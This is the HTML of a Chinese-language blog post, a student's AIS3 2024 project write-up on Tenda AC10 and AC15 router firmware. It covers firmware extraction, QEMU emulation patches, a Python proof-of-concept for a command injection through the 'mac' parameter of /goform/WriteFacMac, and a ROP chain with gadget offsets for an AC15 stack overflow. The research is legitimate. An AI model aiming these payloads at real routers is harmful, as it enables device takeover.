@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="AIS3 2024 新型態資安暑期課程-心得
+Author: 堇姬Naup
+
+專題我是網頁、IoT及軟體安全的A2。這次是做IoT的漏洞專題，這次是研究Tenda router，研究的型號是AC10、AC15兩個型號，並且嘗試從CVE付現到挖出漏洞，雖然沒有拿最佳專題(感覺差一點點就可以拿到)，但我"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="AIS3 2024 新型態資安暑期課程-心得"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="AIS3 2024 新型態資安暑期課程-心得
+Author: 堇姬Naup
+
+專題我是網頁、IoT及軟體安全的A2。這次是做IoT的漏洞專題，這次是研究Tenda router，研究的型號是AC10、AC15兩個型號，並且嘗試從CVE付現到挖出漏洞，雖然沒有拿最佳專題(感覺差一點點就可以拿到)，但我"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>AIS3 2024 新型態資安暑期課程-心得 | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>AIS3 2024 新型態資安暑期課程-心得</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-08-05
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="AIS3-2024-新型態資安暑期課程-心得"><a href="#AIS3-2024-新型態資安暑期課程-心得" class="headerlink" title="AIS3 2024 新型態資安暑期課程-心得"></a>AIS3 2024 新型態資安暑期課程-心得</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><p>我是網頁、IoT及軟體安全的A2。<br>這次是做IoT的漏洞專題，這次是研究Tenda router，研究的型號是AC10、AC15兩個型號，並且嘗試從CVE付現到挖出漏洞，雖然沒有拿最佳專題(感覺差一點點就可以拿到)，但我也學到很多。以下是研究內容</p>
+<h1 id="AC10-CVE付現"><a href="#AC10-CVE付現" class="headerlink" title="AC10 CVE付現"></a>AC10 CVE付現</h1><h2 id="解firmware"><a href="#解firmware" class="headerlink" title="解firmware"></a>解firmware</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -E US_AC10V1.0RTL_V15.03.06.23_multi_TD01.bin</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1CwDivY0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1CwDivY0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>看起來沒有加密</p>
+<p>直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e US_AC10V1.0RTL_V15.03.06.23_multi_TD01.bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="模擬"><a href="#模擬" class="headerlink" title="模擬"></a>模擬</h2><p> qemu-mipsel-static</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lib32z1 qemu-user-static</span><br><span class="line">sudo cp $(which qemu-mipsel-static) ./</span><br></pre></td></tr></table></figure>
+
+<p>可以先嘗試模擬</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/H17CwjwFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H17CwjwFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>追進WeLoveLinux這個string<br>分析一下可能會卡幾個東西<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkKmjsvYC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkKmjsvYC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>apmit_init()、check_network()、ConnectCfm()</p>
+<p>jalr做跳轉到<code>$t9</code>，<code>$t9</code>-&gt;<code>$v0</code>-&gt;<code>apmib_init</code>位置</p>
+<h3 id="apmib-init"><a href="#apmib-init" class="headerlink" title="apmib_init"></a>apmib_init</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/Hy8tCsPtC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hy8tCsPtC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><code>09 F8 20 03</code> -&gt; <code>01 00 02 24</code> </p>
+<p><a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">https://shell-storm.org/online/Online-Assembler-and-Disassembler/</a><br>(patch 成 li  $v0, 1)</p>
+<h3 id="check-network"><a href="#check-network" class="headerlink" title="check_network"></a>check_network</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/BJdfb2vYC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJdfb2vYC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><code>09 F8 20 03</code> -&gt; <code>01 00 02 24</code> </p>
+<p>(patch 成 li  $v0, 1)</p>
+<h3 id="ConnectCfm"><a href="#ConnectCfm" class="headerlink" title="ConnectCfm"></a>ConnectCfm</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/B1Cg73DFR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1Cg73DFR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><code>09 F8 20 03</code> -&gt; <code>01 00 02 24</code> </p>
+<p>(patch 成 li  $v0, 1)</p>
+<p>都patch掉了</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/ByLoWhPFA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByLoWhPFA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mipsel-static ./bin/httpd_patch</span><br></pre></td></tr></table></figure>
+
+<p>run起來可以跑了<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJP53hwtR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJP53hwtR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h3 id="網卡"><a href="#網卡" class="headerlink" title="網卡"></a>網卡</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/Bk36AhDK0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bk36AhDK0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>ip -&gt; g_lan_ip -&gt; br0<br>find br0 ip &amp; listen br0網路接口ip<br>所以我們可以加入一個br0橋接網卡，並把網卡ens33加進去，這樣就可以抓到正確的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkbukavFA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkbukavFA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>成功模擬<br><div class="img-item" data-src="https://hackmd.io/_uploads/SypjYaPKR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SypjYaPKR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="Page-not-found"><a href="#Page-not-found" class="headerlink" title="Page not found"></a>Page not found</h2><p>webroot重新定向到webroot_ro</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf webroot</span><br><span class="line">sudo ln -s webroot_ro/ webroot </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>formDefineTendDa() -&gt;<br>&#x2F;goform&#x2F;WriteFacMac</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJvgdkdYC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJvgdkdYC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>可以控mac，doSystemCmd就是可以執行命令，所以有command injection</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1tgw1dtC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1tgw1dtC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="pwned"><a href="#pwned" class="headerlink" title="pwned!!"></a>pwned!!</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/B1IXsCPFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1IXsCPFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJR5sADF0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJR5sADF0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>第一次送請求被redirect掉，所以送兩次</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.247.132&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://&#123;&#125;/goform/WriteFacMac&#x27;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ip),</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0)Gecko/20100101 Firefox/104.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;password=aaa&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;naup.txt&quot;</span></span><br><span class="line">cmd = <span class="string">&#x27;;echo pwned by NAUP &gt; /webroot/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(file_name)</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">&#x27;mac&#x27;</span>: cmd&#125;</span><br><span class="line">response_get = requests.get(url, headers=headers, params=payload)</span><br><span class="line">response_get = requests.get(url, headers=headers, params=payload)</span><br></pre></td></tr></table></figure>
+
+<h1 id="AC15-漏洞挖掘"><a href="#AC15-漏洞挖掘" class="headerlink" title="AC15 漏洞挖掘"></a>AC15 漏洞挖掘</h1><h2 id="Emulation"><a href="#Emulation" class="headerlink" title="Emulation"></a>Emulation</h2><p>debug 要裝 gdb-multiarch<br>arch : arm<br>binwalk -e 噴 error 的話先裝這個<br><a target="_blank" rel="noopener" href="https://github.com/devttys0/sasquatch">https://github.com/devttys0/sasquatch</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static</span><br><span class="line">terry1234@ubuntu:~/AIS3_2024/Tenda_AC15/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root$ sudo cp $(which qemu-arm-static) ./</span><br><span class="line">註 : qemu 擺的位置要對</span><br></pre></td></tr></table></figure>
+
+<p>sub_2E420 是 main()，他的啟動畫面跟 AC10 一模一樣，印象中 AC10 是有 symbol 的，可以對著看<br>IDA Pro ALT + t 可以找字串，找到後看 xref 辨別函數，我猜 AC10 AC15 寫的差不多</p>
+<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/BkMmDbDK0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkMmDbDK0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>先跳到print WeLoveLinux的地方，看卡在哪</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/S1Tnv-vtA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1Tnv-vtA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h3 id="check-network-1"><a href="#check-network-1" class="headerlink" title="check network"></a>check network</h3><p>check network -&gt; 死迴圈 -&gt; sleep<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJLKUh8YC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJLKUh8YC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>MOV R3,R0(0030a0e1) -&gt; MOV R3,#1(0130a0e3) </p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/S1ssUnIY0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1ssUnIY0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>再回來看發現patch掉了<br><div class="img-item" data-src="https://hackmd.io/_uploads/SyA6UnLFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyA6UnLFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h3 id="ConnectCfm-1"><a href="#ConnectCfm-1" class="headerlink" title="ConnectCfm"></a>ConnectCfm</h3><p>ConnectCfm-&gt;掛掉<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1ikDhIFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1ikDhIFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>MOV R3,R0(0030a0e1) -&gt; MOV R3,#1(0130a0e3)<br><div class="img-item" data-src="https://hackmd.io/_uploads/HkYMPhItR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkYMPhItR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJxDvnUYA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJxDvnUYA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkEfvWvYR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkEfvWvYR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="網卡-1"><a href="#網卡-1" class="headerlink" title="網卡"></a>網卡</h2><p>看上方發現抓到的ip不對</p>
+<p>追進去看<br><div class="img-item" data-src="https://hackmd.io/_uploads/HknsvEDFR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HknsvEDFR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>ip -&gt; g_lan_ip -&gt; br0<br>find br0 ip &amp; listen br0網路接口ip<br>所以我們可以加入一個br0橋接網卡，並把網卡ens33加進去，這樣就可以抓到正確的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SyOeJzDt0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyOeJzDt0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf webroot</span><br><span class="line">sudo ln -s webroot_ro/ webroot </span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkmNyGwKC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkmNyGwKC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu ./bin/httpd_patch</span><br></pre></td></tr></table></figure>
+
+<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu -g 30000 ./bin/httpd_patch</span><br><span class="line">gdb-multiarch ./bin/httpd_patch</span><br><span class="line">// 進到gdb</span><br><span class="line">target remote :30000</span><br><span class="line">c //可以看到開始跑</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1sQwzDYR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1sQwzDYR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/rJcZRzDY0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJcZRzDY0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a ./lib/libc.so.0 | grep &quot;system&quot;</span><br><span class="line">ROPgadget -a ./lib/libc.so.0</span><br></pre></td></tr></table></figure>
+
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>gadget</th>
+<th>address</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>libc system offset</td>
+<td>0x0005a270</td>
+</tr>
+<tr>
+<td>pop {r3, pc}</td>
+<td>0x00018298</td>
+</tr>
+<tr>
+<td>mov r0, sp ; blx r3</td>
+<td>0x00040cb8</td>
+</tr>
+</tbody></table>
+<p>sub_2E9EC() -&gt;<br>&#x2F;goform -&gt; 下方有define追進去</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJcUQytY0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJcUQytY0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>&#x2F;SetNetControlList (可以專注找set開頭之類的，因為比較有機會可以跟他互動)<br><div class="img-item" data-src="https://hackmd.io/_uploads/ryujswuYA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryujswuYA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>追進去<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1PJhvOFR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1PJhvOFR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>list傳入 -&gt; 資料進到sub_7DD20<br>進到</p>
+<p>strcpy<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJfM2POtR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJfM2POtR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>往上追發現dest固定大小並且在rbp-0x260，可以buffer overflow<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1RV2PdFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1RV2PdFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd_patch</span><br><span class="line">target remote :30000</span><br><span class="line">b *0x5AD3C</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125;</span><br><span class="line">system address</span><br><span class="line">mov r0, sp ; blx r3</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>
+<p>pop掉後<br>r3 -&gt; system<br>pc(rip的概念) -&gt; mov r0, sp ; blx r3 gadget address<br>接下來會跳轉到pc的位置，跳到gadget<br>mov r0, sp ; blx r3</p>
+<p>到這裡時候，sp(rsp -&gt; stack頂部)拿出cmd，放入r0<br>blx r3跳進去system</p>
+<p>get shell</p>
+<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>首先qemu的vmmap不能用，所以要找其他方式找<br>另外qemu每次模擬libc base都一樣</p>
+<p>這邊我有在想，如果是在實體機的狀況要怎麼辦，查了一些資料後發現，這個情況下，與CTF不同，通常crash掉後機器重啟libc base與之前相同，所以可以嘗試爆破libc base作為手段，另外也可以利用其他information leak相關洞來leak libc</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1yfkn_KA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1yfkn_KA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>這裡有puts先跳進去，讓GOT有libc位置，然後進看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x0002E4FC #下斷點</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Hk5mSnuYR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hk5mSnuYR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkdtrnOFC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkdtrnOFC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>puts經過ASLR後address(0x3fdd1cd4)-puts offset(0x35cd4) &#x3D; 0x3fd9c000(libc base)</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryEVN2dK0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryEVN2dK0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
